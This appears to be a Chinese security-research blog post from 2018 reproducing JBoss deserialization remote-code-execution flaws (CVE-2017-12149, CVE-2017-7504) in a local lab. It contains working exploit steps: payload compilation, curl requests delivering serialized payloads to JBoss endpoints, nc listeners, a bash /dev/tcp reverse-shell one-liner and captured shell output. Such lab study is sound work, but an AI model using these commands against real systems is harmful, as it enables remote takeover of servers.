---
title: Jboss 漏洞学习
date: 2018-03-30 18:13:23
tags:
		- Jboss
categories:
		- 安全研究
---

`Jboss`漏洞学习。

<!-- more -->

#### Jboss 漏洞学习

复现一下其中的漏洞，然后学习一下其中的原理。

#### [jboss下载](http://jbossas.jboss.org/downloads)



首先下载环境，根据对应的漏洞下载合适的版本进行测试。

#### 环境搭建

1:在`run.bat`文件中，第一行进行编辑，添加。

	--"set JAVA_HOME=E:\Java\jdk1.7.0_45"(JDK安装目录)

2: 修改`Jboss`的端口

`\server\default\deploy\jbossweb.sar\server.xml`。

修改端口号。

	 <!-- A HTTP/1.1 Connector on port 8080 -->
      <Connector protocol="HTTP/1.1" port="12149" address="${IP}" 
         redirectPort="${jboss.web.https.port}" />

访问`127.0.0.1:12149`，即可看到页面。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-3-30/58007108.jpg)


#### [Jenkins “Java 反序列化”过程远程命令执行漏洞 CVE-2015-8103](https://jenkins.io/security/advisory/2015-11-11/#remote-code-execution-vulnerability-due-to-unsafe-deserialization-in-jenkins-remoting)

#### [JBOSSAS 5.x/6.x 反序列化命令执行漏洞 CVE-2017-12149](https://mp.weixin.qq.com/s/zUJMt9hdGoz1TEOKy2Cgdg)



[工具1](https://github.com/frohoff/ysoserial)
[工具2](https://github.com/joaomatosf/JavaDeserH2HC)

使用工具2：

__1:编译预置payload的java文件__

	 javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java


__2:反弹shell的IP和端口__

	java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap 192.168.145.154 1234

设置监听端口，nc命令学会使用。

	root@kali:~# nc -vv -l -p 1234
	listening on [any] 1234 ...
	connect to [192.168.145.154] from localhost [192.168.145.1] 10244


__3:使用curl向/invoker/readonly提交payload__


	curl http://192.168.86.194:12149/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser


__反弹shell__

	root@kali:~# nc -vv -l -p 1234
	listening on [any] 1234 ...
	connect to [192.168.145.154] from localhost [192.168.145.1] 10244
	Microsoft Windows [�汾 6.1.7601]
	��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����
	
	E:\Download\jboss600\bin>ls
	ls
	
	E:\Download\jboss600\bin>dir
	dir
	 ������ E �еľ��� �ĵ�
	 �������к��� 000D-D35E


__抓包__






#### [JBOSSAS 4.x 反序列化命令执行漏洞 CVE-2017-7504](https://www.seebug.org/vuldb/ssvid-96881)

[PoC CVE-2017-7504 - JBossMQ JMS Invocation Layer](https://www.youtube.com/watch?v=jVMr4eeJ2Po)

步骤以下，但是`JBoss4.2.3`没有成功。

	root@kali:~/JavaDeserH2HC# javac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1.java

	监听端口
	root@kali:~# nc -vv -l -p 2345
	listening on [any] 2345 ...

	root@kali:~/JavaDeserH2HC# java -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1 '/bin/bash -i>&/dev/tcp/192.168.145.154/2345<&1'

	root@kali:~/JavaDeserH2HC# curl http://192.168.86.194:7504/jbossmq-httpil/HTTPServerILServlet --data-binary @ExampleCommonsCollections1.ser

	



#### 序列化资料集锦

[JBoss安全问题总结](http://cb.drops.wiki/drops/papers-178.html)

[how deserializing objects will ruin your day](https://frohoff.github.io/appseccali-marshalling-pickles/)

[Java反序列化测试备忘录](http://ph0rse.me/2018/02/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%8B%E8%AF%95%E5%A4%87%E5%BF%98%E5%BD%95/)

[Lab for Java Deserialization Vulnerabilities](https://github.com/joaomatosf/JavaDeserH2HC/)


[PoC CVE-2017-7504 - JBossMQ JMS Invocation Layer](https://www.youtube.com/watch?v=jVMr4eeJ2Po)

[What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? ](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#jenkins)

[JBoss “Java 反序列化”过程远程命令执行漏洞](https://www.seebug.org/vuldb/ssvid-89723)

[深入理解 JAVA 反序列化漏洞](https://paper.seebug.org/312/)





